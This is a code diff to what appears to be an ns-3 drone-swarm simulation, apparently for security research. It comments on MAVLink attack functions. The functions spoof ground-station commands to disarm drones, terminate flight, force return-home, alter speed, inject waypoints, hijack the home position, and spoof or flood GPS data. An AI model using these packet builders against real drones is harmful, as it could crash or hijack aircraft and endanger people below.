@@ -40,7 +40,7 @@ potentially causing the drone to travel to unintended locations or become isolat
 std::vector<uint8_t> CreateMavlinkMissionPacket(uint8_t target_system, uint8_t target_component,
                                          float lat, float lon, float alt) {
     mavlink_message_t msg;
-    uint8_t system_id = 1;   // Drone 0 (sender)
+    uint8_t system_id = 1;   // Drone 0 (sender) spoof that missions comes form drone 0(system_id 1)
     uint8_t component_id = 1; // Component ID
 
     // Initialize mission item structure
@@ -104,6 +104,9 @@ std::vector<uint8_t> CreateFakeGpsPacket(uint8_t droneId, double lat, double lon
 }
 
 // Creates GPS packets for non-existent drones
+// This function generates a spoofed GPS packet for a drone with a given system ID.
+// The packet contains random GPS coordinates within 1km of the reference point.
+// It can be used to simulate GPS data for drones that are not actually present in the simulation
 std::vector<uint8_t> CreateSpoofedDroneGpsPacket(uint8_t spoofedSystemId) {
     mavlink_message_t msg;
     uint8_t component_id = 0;
@@ -132,10 +135,10 @@ std::vector<uint8_t> CreateSpoofedDroneGpsPacket(uint8_t spoofedSystemId) {
 }
 
 
-// Create a change speed command_long packet that will be used by attacker to change the speed of drones and make it move slower or faster
+// Create a change speed command_long packet that will be used by attacker to change the speed of drones and make it move slower or faster to disturb its mission
 std::vector<uint8_t> CreateChangeSpeedPacket(uint8_t target_system, float speedType, float speed) {
     mavlink_message_t msg;
-    uint8_t system_id = 255;   // Attacker system ID (typically GCS)
+    uint8_t system_id = 255;   // Attacker system ID (spoofed GCS)
     uint8_t component_id = 0;  // Component ID
 
     mavlink_command_long_t cmd = {};
@@ -166,7 +169,7 @@ std::vector<uint8_t> CreateChangeSpeedPacket(uint8_t target_system, float speedT
 // that can be sent to a target drone to make it switch to RTL mode.
 std::vector<uint8_t> CreateForcedReturnHomePacket(uint8_t target_system) {
     mavlink_message_t msg; 
-    uint8_t system_id = 255;   // Attacker or Ground Control Station (GCS) system ID
+    uint8_t system_id = 255;   // Attacker (spoofed GCS)
     uint8_t component_id = 0;  // Target component ID (0 = autopilot)
 
     // Set base_mode to indicate a custom mode change is requested
@@ -223,7 +226,7 @@ std::vector<uint8_t> CreateForcedReturnHomePacket(uint8_t target_system) {
 // It can be used by an attacker to disarm a drone remotely
 std::vector<uint8_t> CreateForcedDisarmPacket(uint8_t target_system) {
     mavlink_message_t msg;             
-    uint8_t system_id = 255;           // Attacker / GCS system ID
+    uint8_t system_id = 255;           // Attacker (spoofed GCS)
     uint8_t component_id = 0;          
 
     mavlink_command_long_t cmd = {};   // Structure for COMMAND_LONG message
@@ -250,10 +253,11 @@ std::vector<uint8_t> CreateForcedDisarmPacket(uint8_t target_system) {
     return std::vector<uint8_t>(buffer, buffer + len);
 }
 
-// This function creates a flight termination command to be send to a target_system 
+// This function creates a flight termination command to be send to a target_system
+// Drones will terminate their flight when they receive this command
 std::vector<uint8_t> CreateFlightTerminationPacket(uint8_t target_system) {
     mavlink_message_t msg;
-    uint8_t system_id = 255;   // Attacker system ID 
+    uint8_t system_id = 255;   // Attacker (spoofed GCS)
     // system ID 255 is generally used as a "GCS" (Ground Control Station) 
     uint8_t component_id = 0;  // Component ID
     mavlink_command_long_t cmd = {};
@@ -277,53 +281,13 @@ std::vector<uint8_t> CreateFlightTerminationPacket(uint8_t target_system) {
     return std::vector<uint8_t>(buffer, buffer + len);
 }
 
-// Create false battery status packet
-// system_id is the sender system ID (the drone reporting the battery).
-
-// Create a MAVLink BATTERY_STATUS packet with a custom battery percentage
-std::vector<uint8_t> CreateBatteryPacket(uint8_t system_id, uint8_t battery_percent) {
-    mavlink_message_t msg;          
-    uint8_t component_id = 1;       // Autopilot component (sender)
-
-    // Initialize the BATTERY_STATUS message struct
-    mavlink_battery_status_t bat = {};
-    bat.id = 0;                     // Battery ID 0 (first battery)
-    bat.battery_function = 0;       // Standard battery function (default)
-    bat.type = 0;                    // Battery type unknown/default
-    bat.temperature = INT16_MAX;     // Unknown temperature (INT16_MAX)
-
-    bat.voltages[0] = 12600;        // Voltage of first cell in mV
-    for (int i = 1; i < 10; i++) 
-        bat.voltages[i] = 65535;    // Other cell voltages unknown (65535)
-
-    bat.current_battery = 0;        // Instantaneous battery current (mA)
-    bat.current_consumed = 0;       // Total current consumed (mAh)
-    bat.energy_consumed = 0;        // Total energy consumed (mWh)
-    bat.battery_remaining = battery_percent; // Remaining battery percentage (0–100)
-    bat.time_remaining = 0;         // Estimated time remaining unknown
-    bat.charge_state = 1;           // Battery charging/discharging state (1 = normal)
-    
-    for (int i = 0; i < 4; i++) 
-        bat.voltages_ext[i] = 0;    // Extended voltages unknown/unused
-
-    bat.mode = 0;                    // Battery mode (default)
-    bat.fault_bitmask = 0;           // No battery faults
-
-    // Encode the struct into a MAVLink message with sender ID and component
-    mavlink_msg_battery_status_encode(system_id, component_id, &msg, &bat);
-
-    // Convert the MAVLink message into a byte buffer for sending
-    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
-    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
-
-    // Return the raw byte vector containing the MAVLink packet
-    return std::vector<uint8_t>(buffer, buffer + len);
-}
-
 // Create SET_HOME_POSITION MAVLink packet
+// This function creates a MAVLink packet to set the home position of a drone
+// It can be used by an attacker to change the home position of a drone, potentially causing it to return to an unintended location. 
+// In this case attacker will send home position relative to his location to hijack the drone      
 std::vector<uint8_t> CreateSetHomePositionPacket(uint8_t target_system, double lat, double lon, double alt) {
     mavlink_message_t msg;
-    uint8_t system_id = 255;   // Attacker system ID (GCS)
+    uint8_t system_id = 255;   // Attacker (spoofed GCS)
     uint8_t component_id = 0;  // Component ID
 
     mavlink_command_long_t cmd = {};
@@ -346,6 +310,8 @@ std::vector<uint8_t> CreateSetHomePositionPacket(uint8_t target_system, double l
     uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
     return std::vector<uint8_t>(buffer, buffer + len);
 }
+
+//-------------------------------------------------------------------------Execute Attacks Fubctions-----------------------------------------------------
 
 // Function to execute flight termination attack on drones 1 and 2 
 void ExecuteFlightTerminationAttack(Ptr<Socket> socket) {
@@ -408,7 +374,7 @@ void ExecuteForceDisarmAttack(Ptr<Socket> socket) {
     }
 }
 
-// Function to execute force disarm attack on drones 1 and 2
+// Function to execute force return to land (return home) attack on drones 1 and 2
 void ExecuteForceRTLAttack(Ptr<Socket> socket) {
     // Attack drones 1 and 2 (sysid 2 and 3)
     std::vector<uint8_t> term1 = CreateForcedReturnHomePacket(2); // Drone1 sysid=2
@@ -439,7 +405,7 @@ void ExecuteForceRTLAttack(Ptr<Socket> socket) {
     }
 }
 
-// Execute GPS spoofing attack
+// Execute GPS spoofed positon for actual drones (1,2,3) attack
 /**
 Every drone receives spoofed positions for all other drones
 Packets appear to come from legitimate drones (via spoofed system_id)
@@ -447,9 +413,9 @@ Packets appear to come from legitimate drones (via spoofed system_id)
 // This attack is in the network layer and will not be forwarded to zmq and parsed by the mavlink parser
 // It will be sent directly to the drones via UDP sockets
 void ExecuteGpsSpoofingAttack(Ptr<Socket> socket) {
-    double fakeLat = 50;
-    double fakeLon = 50;
-    double fakeAlt = 50;
+    double fakeLat = 50; // fixed latitude for spoofing
+    double fakeLon = 50; // fixed longitude for spoofing 
+    double fakeAlt = 50; // fixed altitude for spoofing
 
     // Spoof positions for ALL drones (0,1,2)
     for (uint8_t spoofedDroneId = 0; spoofedDroneId <= 2; spoofedDroneId++) {
@@ -477,6 +443,8 @@ void ExecuteGpsSpoofingAttack(Ptr<Socket> socket) {
 }
 
 // Attack execution function
+// This function floods the network with spoofed GPS packets for non-existent drones
+// It creates fake GPS packets for drones with system IDs 4 to 10 and sends them
 void ExecuteSpoofedDroneFloodAttack(ns3::Ptr<ns3::Socket> socket) {
     // Target all real drones (0,1,2)
     for (uint32_t i = 0; i < droneIpAddresses.size(); i++) {
@@ -499,6 +467,10 @@ void ExecuteSpoofedDroneFloodAttack(ns3::Ptr<ns3::Socket> socket) {
     }
 }
 // Execute home position hijack attack
+// This function sends SET_HOME_POSITION commands to drones 1 and 2
+// It sets their home position to the attacker's location, potentially causing them to return to the attacker's position
+// This can be used to hijack the drones and make them return to the attacker's location
+// Its scheduled to run every 1 second for 3 minutes (180 seconds)
 void ExecuteSetHomeAttack(Ptr<Socket> socket) {
     // Calculate attacker's GPS coordinates (from main.cc position)
     double attackerLat = s_refLat + (100.0 / s_metersPerDegreeLat);  // y=100m -> lat
@@ -532,7 +504,9 @@ void ExecuteSetHomeAttack(Ptr<Socket> socket) {
         Simulator::Schedule(Seconds(1), &ExecuteSetHomeAttack, socket);
     }
 }
-// - SendWaypointPairFromAttacker
+
+// SendWaypointPairFromAttacker
+// This function sends a pair of waypoints to both drones 1(system id 2 ) and drone 2(system id 3) from the attacker node
 void SendWaypointPairFromAttacker(int pairIndex) {
     // Use the attacker node to send mission items, similar to SendWaypointPairFromDrone0 but with more waypoints
     Ptr<Node> attackerNode = Attacker.Get(0);
